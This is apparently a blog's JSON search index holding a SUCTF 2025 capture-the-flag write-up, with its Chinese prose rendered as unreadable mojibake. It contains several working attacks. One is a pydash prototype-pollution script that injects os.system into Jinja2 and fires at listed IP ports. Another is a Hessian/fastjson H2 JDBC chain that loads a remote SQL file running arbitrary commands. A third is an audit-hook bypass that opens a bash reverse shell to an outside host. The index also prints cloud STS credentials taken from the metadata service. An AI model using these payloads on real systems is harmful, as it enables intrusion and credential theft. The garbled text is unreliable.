\u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: 